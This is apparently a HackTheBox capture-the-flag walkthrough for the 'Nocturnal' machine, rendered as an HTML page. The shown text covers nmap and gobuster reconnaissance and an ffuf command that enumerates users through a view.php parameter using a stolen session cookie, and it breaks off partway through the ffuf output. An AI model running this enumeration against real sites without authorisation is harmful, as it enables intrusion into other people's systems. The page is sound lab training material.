        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#directory-and-subdomain-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Directory and subdomain enumeration
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#user-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      User enumeration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="User enumeration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#why-it-works" class="md-nav__link">
    <span class="md-ellipsis">
      Why it works:
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#why-also-cleanentry-is-not-enough" class="md-nav__link">
    <span class="md-ellipsis">
      Why also cleanEntry() is not enough:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-testing" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: testing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-rev-shell-upload" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: rev shell: upload
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-injection-rev-shell-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Command injection: rev shell: execution
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#port-forwarding" class="md-nav__link">
    <span class="md-ellipsis">
      Port forwarding
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p>This is an "easy" linux machine from HackTheBox, lets dive in. <br />
<img alt="Pasted image 20250527225024" src="../MediaFiles/Pasted%20image%2020250527225024.png" /></p>
<p>No Machine Information/description was provided.</p>
<p>[[linux]] [[commandinjection]] [[codereview]] [[PortForwarding]]<br />
Tags: #linux #commandinjection #codereview #PortForwarding<br />
Tools used:<br />
ffuf (webapp's users enumeration)<br />
BurpSuite (web requests modification)<br />
Hashcat (hash cracking)<br />
wget (file transfers)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<p>add machine to hosts<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.11.64 nocturnal.htb&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
</span></code></pre></div></p>
<p>lets start our nmap scan:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>nocturnal.htb<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>-T4
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-05-27<span class="w"> </span><span class="m">16</span>:38<span class="w"> </span>EDT
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>nocturnal.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.64<span class="o">)</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.047s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.2p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.12<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>nginx<span class="w"> </span><span class="m">1</span>.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">7</span>.56<span class="w"> </span>seconds
</span></code></pre></div></p>
<p>What we see here is pretty straightforward, only 2 ports open, one for the ssh service, and one for the http</p>
<p>Since we have no info yet about any user, we will start with the http service.</p>
<h4 id="directory-and-subdomain-enumeration">Directory and subdomain enumeration</h4>
<p>Lets do a directory enumeration using gobuster, to find as much information as possible about the web service.<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-e<span class="w"> </span>-t50<span class="w"> </span>-x<span class="w"> </span>php,txt,html<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-u<span class="w"> </span>nocturnal.htb
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>â”€#<span class="w"> </span>gobuster<span class="w"> </span>dir<span class="w"> </span>-e<span class="w"> </span>-t50<span class="w"> </span>-x<span class="w"> </span>php,txt,html<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-u<span class="w"> </span>nocturnal.htb
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="o">===============================================================</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="o">===============================================================</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://nocturnal.htb
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">50</span>
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.6
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>php,txt,html
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Expanded:<span class="w">                </span><span class="nb">true</span>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="o">===============================================================</span>
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="o">===============================================================</span>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>http://nocturnal.htb/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">1524</span><span class="o">]</span>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>http://nocturnal.htb/login.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">644</span><span class="o">]</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>http://nocturnal.htb/register.php<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">649</span><span class="o">]</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>http://nocturnal.htb/view.php<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">2919</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>login.php<span class="o">]</span>
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>http://nocturnal.htb/uploads<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>http://nocturnal.htb/uploads.txt<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>http://nocturnal.htb/uploads.html<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>http://nocturnal.htb/admin.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>login.php<span class="o">]</span>
</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>http://nocturnal.htb/logout.php<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>login.php<span class="o">]</span>
</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>http://nocturnal.htb/dashboard.php<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">302</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">0</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>login.php<span class="o">]</span>
</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>http://nocturnal.htb/backups<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">178</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://nocturnal.htb/backups/<span class="o">]</span>
</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>http://nocturnal.htb/uploads2.html<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>http://nocturnal.htb/uploads2<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>http://nocturnal.htb/uploads2.txt<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">403</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">162</span><span class="o">]</span>
</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>Progress:<span class="w"> </span><span class="m">882240</span><span class="w"> </span>/<span class="w"> </span><span class="m">882244</span><span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a><span class="o">===============================================================</span>
</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a><span class="nv">Finished</span>
</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a><span class="o">===============================================================</span>
</span></code></pre></div><br />
perfect, it appears that there are not much pages to explore.</p>
<p>Now we can search also for subdomains too:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>nocturnal.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">50</span>
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="o">===============================================================</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>Gobuster<span class="w"> </span>v3.6
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="o">===============================================================</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain:<span class="w">     </span>nocturnal.htb
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">    </span><span class="m">50</span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">    </span>1s
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">   </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="o">===============================================================</span>
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>DNS<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="o">===============================================================</span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>Progress:<span class="w"> </span><span class="m">220560</span><span class="w"> </span>/<span class="w"> </span><span class="m">220561</span><span class="w"> </span><span class="o">(</span><span class="m">100</span>.00%<span class="o">)</span>
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="o">===============================================================</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="nv">Finished</span>
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="o">===============================================================</span>
</span></code></pre></div><br />
so no subdomains were found, lets move on</p>
<p>Browsing to the web app, we landed on this homepage:<br />
<img alt="Pasted image 20250529003539" src="../MediaFiles/Pasted%20image%2020250529003539.png" /></p>
<p>First, lets register a new user (ch3ckm8) and then login.</p>
<p>On both login and register pages i tried performing <code>sql injection</code> but was not successful, so i moved on.</p>
<p>Then i uploaded a new file (be aware of the valid file extensions)<br />
<img alt="Pasted image 20250529004248" src="../MediaFiles/Pasted%20image%2020250529004248.png" /><br />
which can be seen there, lets try downloading it.</p>
<p>If we hover over the file , in this case the file i uploaded <code>accounts.xlsx</code>, shows the download link in the bottom of the page:<br />
<img alt="Pasted image 20250529004507" src="../MediaFiles/Pasted%20image%2020250529004507.png" /><br />
The url looks like this:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>http://nocturnal.htb/view.php?username<span class="o">=</span>ch3ckm8<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>accounts.xlsx
</span></code></pre></div></p>
<p>This is an interesting observation and could be a way to enumerate the users of this website.</p>
<h1 id="foothold">Foothold</h1>
<h5 id="user-enumeration">User enumeration</h5>
<p>For the fuzzing, we need 3 things:<br />
- target url containing parameter for the usernames<br />
- our current phpsessionid (cookie)<br />
-  wordlist for usernames</p>
<ol>
<li>
<p>From earlier, we have the target url:<br />
<code>http://nocturnal.htb/view.php?username=ch3ckm8&amp;file=accounts.xlsx</code></p>
</li>
<li>
<p>Use burp to grab your phpsessid, in order to perform user enumeration (via interception of the request)<br />
<img alt="Pasted image 20250529003653" src="../MediaFiles/Pasted%20image%2020250529003653.png" /></p>
</li>
<li>
<p>For the wordlist, i used this one from SecLists:<br />
https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt<br />
and used <code>FUZZ</code> keyword on the ffuf command to enumerate users, on the file i specified a random filename and the filename wont matter for the fuzzing process:</p>
</li>
</ol>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>ffuf<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;http://nocturnal.htb/view.php?username=FUZZ&amp;file=sth.xlsx&#39;</span><span class="w"> </span>-w<span class="w"> </span>/root/Downloads/names.txt<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: PHPSESSID=ucd01moit7qaem6bddb8bm1a8n&#39;</span><span class="w"> </span>-fs<span class="w"> </span><span class="m">2985</span>
</span></code></pre></div>
<p>output</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="w">        </span>/<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span><span class="w">          </span>/<span class="err">&#39;</span>___<span class="se">\ </span><span class="w">      </span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">       </span>/<span class="se">\ \_</span>_/<span class="w"> </span>/<span class="se">\ \_</span>_/<span class="w">  </span>__<span class="w">  </span>__<span class="w">  </span>/<span class="se">\ \_</span>_/<span class="w">       </span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">       </span><span class="se">\ \ </span>,__<span class="se">\\</span><span class="w"> </span><span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span><span class="w">     </span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="w">        </span><span class="se">\ \ \_</span>/<span class="w"> </span><span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/<span class="w">      </span>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">         </span><span class="se">\ \_\ </span><span class="w">  </span><span class="se">\ \_\ </span><span class="w"> </span><span class="se">\ \_</span>___/<span class="w">  </span><span class="se">\ \_\ </span><span class="w">      </span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">          </span><span class="se">\/</span>_/<span class="w">    </span><span class="se">\/</span>_/<span class="w">   </span><span class="se">\/</span>___/<span class="w">    </span><span class="se">\/</span>_/<span class="w">       </span>
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">       </span>v2.1.0-dev
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>________________________________________________
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="w"> </span>::<span class="w"> </span>Method<span class="w">           </span>:<span class="w"> </span>GET
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="w"> </span>::<span class="w"> </span>URL<span class="w">              </span>:<span class="w"> </span>http://nocturnal.htb/view.php?username<span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>accounts.xlsx
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="w"> </span>::<span class="w"> </span>Wordlist<span class="w">         </span>:<span class="w"> </span>FUZZ:<span class="w"> </span>/root/Downloads/names.txt
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="w"> </span>::<span class="w"> </span>Header<span class="w">           </span>:<span class="w"> </span>Cookie:<span class="w"> </span><span class="nv">PHPSESSID</span><span class="o">=</span>ucd01moit7qaem6bddb8bm1a8n
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="w"> </span>::<span class="w"> </span>Follow<span class="w"> </span>redirects<span class="w"> </span>:<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="w"> </span>::<span class="w"> </span>Calibration<span class="w">      </span>:<span class="w"> </span><span class="nb">false</span>
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="w"> </span>::<span class="w"> </span>Timeout<span class="w">          </span>:<span class="w"> </span><span class="m">10</span>
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a><span class="w"> </span>::<span class="w"> </span>Threads<span class="w">          </span>:<span class="w"> </span><span class="m">40</span>
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="w"> </span>::<span class="w"> </span>Matcher<span class="w">          </span>:<span class="w"> </span>Response<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>-299,301,302,307,401,403,405,500
